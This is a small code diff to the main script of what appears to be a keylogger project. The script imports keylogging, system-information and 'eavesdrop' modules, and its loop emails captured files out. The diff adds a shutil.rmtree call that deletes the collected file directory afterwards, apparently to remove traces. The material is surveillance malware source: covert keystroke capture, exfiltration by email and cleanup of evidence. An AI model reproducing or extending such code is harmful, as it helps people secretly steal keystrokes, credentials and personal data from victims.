@@ -1,3 +1,5 @@
+import shutil
+
 from KeyLogger import KeyLogger
 from SystemInfoProvider import SystemInfoProvider
 from key_logger.eavesdrop import EavesdropService
@@ -30,3 +32,5 @@ if __name__ == '__main__':
         email_service.send_email(filenames)
 
         number_of_iterations += 1
+
+    shutil.rmtree(file_path)
